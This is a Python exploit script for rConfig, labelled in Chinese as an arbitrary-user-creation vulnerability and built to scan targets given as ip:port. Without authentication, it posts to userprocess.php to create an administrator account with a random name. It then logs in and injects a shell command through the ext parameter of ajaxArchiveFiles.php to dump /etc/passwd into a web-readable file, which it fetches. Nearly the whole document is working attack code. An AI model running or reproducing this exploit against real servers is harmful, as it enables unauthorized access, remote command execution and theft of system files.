# !/usr/bin/env python3
# -*- coding:utf-8 -*-

import base64
import requests
import random
import re
import json
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests_toolbelt.multipart.encoder import MultipartEncoder

def title():
    print('+----------------------------------------------------------')
    print('+  fofa:app="rConfig"                                      ')
    print('+  Version: rConfig userprocess.php 任意用户创建漏洞          ')
    print('+----------------------------------------------------------')

def run_proto(target_url):
    vuln_url = target_url + "/lib/crud/userprocess.php"
    referer = target_url + "useradmin.php"
    ran_number = random.randint(1, 999)
    origin = target_url
    multipart_data = MultipartEncoder(
        fields={
            'username': 'pqtest{}'.format(ran_number),
            'password': 'PQtest@{}'.format(ran_number),
            'passconf': 'PQtest@{}'.format(ran_number),
            'email': 'PQtest{}@test.com'.format(ran_number),
            'ulevelid': '9',
            'add': 'add',
            'editid': ''
        }
    )
    headers = {'Content-Type': multipart_data.content_type,
               'Upgrade-Insecure-Requests': "1",
               'Referer': referer,
               'Origin': origin}
    cookies = {'PHPSESSID': 'test'}
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(vuln_url, data=multipart_data, verify=False, cookies=cookies, headers=headers, timeout=4, allow_redirects=False)
        if "error" not in response.text:
            username = 'pqtest{}'.format(ran_number)
            password = 'PQtest@{}'.format(ran_number)
            print("成功创建账户 pqtest{}/PQtest@{}".format(ran_number, ran_number))
            if run_poc(target_url, username, password):
                return True
            else:
                return False
        else:
            print("创建失败:{}")
            return False
    except Exception as e:
        print("请求失败:{}".format(e))
        return False

def run_poc(target_url, username, password):
    print("正在登陆账户.....")
    vuln_url = target_url + "/lib/crud/userprocess.php"
    headers = {
        'Content-Type': "application/x-www-form-urlencoded; charset=UTF-8",
        "Referer": target_url + "deviceConnTemplates.php",
        "Origin": target_url,
        "X-Requested-With": "XMLHttpRequest",
        "Accept-Language": "en-US,en;q=0.5"
    }
    data = {
        'user': username,
        'pass': password,
        'sublogin': '1'
    }
    try:
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10)
        print("正在尝试执行 cat /etc/passwd.....")
        with requests.Session() as s:
            p = s.post(target_url + '/lib/crud/userprocess.php', data=data, timeout=3, verify=False)
            if "Stephen Stack" in p.text:
                print("登录失败")
                return False
            else:
                rce = s.get(target_url + '/lib/ajaxHandlers/ajaxArchiveFiles.php?path=1&ext=;cat%20/etc/passwd%3E../../pq.txt', verify=False, timeout=3, headers=headers)
                if "success" in rce.text:
                    response = s.get(target_url + '/pq.txt', timeout=3, verify=False)
                    print("成功执行 cat /etc/passwd, 响应为:n{}".format(response.text))
                    return True
                else:
                    print("请求失败")
                    return False
    except Exception as e:
        print("请求失败:{}".format(e))
        return False
def run(ip, port):
    i = 0
    proto = ['http', 'https']
    while i < 2:
        target_url = '{}://{}:{}'.format(
            proto[i], ip, port)
        if run_proto(target_url):
            return True
        else:
            i = i + 1


if __name__ == '__main__':
    title()
    target = sys.argv[1]
    ip = target.split(':')[0]
    port = target.split(':')[1]

    result = run(ip, port)

    if result:
        print('Exist')
    else:
        print('UnExist')


